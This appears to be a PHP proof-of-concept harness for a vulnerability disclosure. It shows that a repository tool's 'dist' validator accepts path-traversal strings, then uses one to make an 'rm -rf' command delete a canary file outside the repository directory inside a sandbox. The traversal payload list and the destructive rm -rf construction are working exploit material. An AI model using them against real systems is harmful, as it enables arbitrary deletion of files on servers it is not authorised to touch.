<?php
// PoC harness — run with: php -I verify.php <repo_clone_dir> <sandbox_dir>
// Uses the project's REAL Validate + Dist classes to prove the validator
// accepts a traversing `dist`, then reproduces the exact path construction
// used by Repo\Metadata\Create + Repo\Metadata\Deb and exercises the same
// `rm -rf "<path>"` form that Directory::deleteRecursive() runs.

error_reporting(E_ALL & ~E_DEPRECATED);

$repo    = rtrim($argv[1], '/');
$sandbox = rtrim($argv[2], '/');

require $repo . '/www/controllers/Utils/Validate.php';
require $repo . '/www/controllers/Task/Form/Param/Dist.php';

use Controllers\Task\Form\Param\Dist;

function line($s=''){ fwrite(STDOUT, $s . "\n"); }

line("=== STEP 1: does the real Param\\Dist::check() accept a traversal payload? ===");
$payloads = [
    'bookworm',                               // legitimate
    '../../../../../../../../tmp',            // traversal
    '..%2f..%2f',                             // encoded-ish (literal)
    'a/../../../b',                           // mixed
];
foreach ($payloads as $p) {
    try {
        Dist::check([$p]);
        line(sprintf("  ACCEPTED : %s", $p));
    } catch (\Throwable $e) {
        line(sprintf("  rejected : %-40s (%s)", $p, $e->getMessage()));
    }
}

line();
line("=== STEP 2: reproduce path construction + the rm -rf form on a sandbox ===");

// Mirror REPOS_DIR default (/home/repo) inside the sandbox.
$REPOS_DIR = $sandbox . '/home/repo';

// Attacker-controlled, validator-approved inputs.
$name    = 'myrepo';                                   // Param\Name: no '/', single-segment only
// sandbox/home/repo/deb/myrepo -> 4 '../' reaches the sandbox root, then into VICTIM
$dist    = '../../../../VICTIM';                        // Param\Dist: '/' and '.' allowed -> traversal
$section = 'main';                                     // Param\Section
$date    = '2026-10-09_000000';                        // server-generated date

// Confirm the validator passes this exact dist (real code).
try { Dist::check([$dist]); line("  validator: dist ACCEPTED -> '$dist'"); }
catch (\Throwable $e) { line("  validator: dist rejected (" . $e->getMessage() . ") -- PoC would stop here"); exit(1); }

// Exact concatenation from www/controllers/Repo/Metadata/Create.php (deb branch):
$parentDir    = $REPOS_DIR . '/deb/' . $name . '/' . $dist . '/' . $section;
$snapshotPath = $parentDir . '/' . $date;
line("  built parentDir    = $parentDir");
line("  built snapshotPath = $snapshotPath");

// Set up sandbox: the intended repo tree, and a VICTIM dir OUTSIDE REPOS_DIR
// that the traversal should resolve onto.
@mkdir($REPOS_DIR . '/deb/' . $name, 0775, true);
// The code does mkdir($parentDir, recursive) — create it so the later delete has a target.
@mkdir($parentDir, 0775, true);
@mkdir($snapshotPath, 0775, true);

// What does the snapshotPath actually resolve to?
$resolved = realpath($snapshotPath);
line("  realpath(snapshotPath) = " . var_export($resolved, true));

// Plant a victim directory with a canary file at the resolved location's target.
// snapshotPath resolves to <sandbox>/VICTIM/main/<date>; plant canary there.
$canary = $resolved . '/CANARY.txt';
file_put_contents($canary, "do-not-delete");
line("  canary exists before  = " . (is_file($canary) ? 'YES' : 'no') . "  ($canary)");

// Now run the SAME command form as Directory::deleteRecursive():
//   new Process('/usr/bin/rm -rf "' . $directoryPath . '"')  -> /bin/sh -c
// We target snapshotPath exactly as Create.php would on action create/update.
$cmd = '/bin/rm -rf "' . $snapshotPath . '"';
line("  exec: $cmd");
exec($cmd . ' 2>&1', $out, $rc);
line("  rm exit code = $rc");

clearstatcache(true, $canary);
clearstatcache();
line("  canary exists after   = " . (is_file($canary) ? 'YES (NOT deleted)' : 'NO -> DELETED via traversal'));

// Also prove it escaped REPOS_DIR: show the victim dir lived outside REPOS_DIR.
$insideRepos = strpos((string)$resolved, realpath($REPOS_DIR) ?: $REPOS_DIR) === 0;
line("  resolved path was inside REPOS_DIR? " . ($insideRepos ? 'yes' : 'NO (escaped)'));
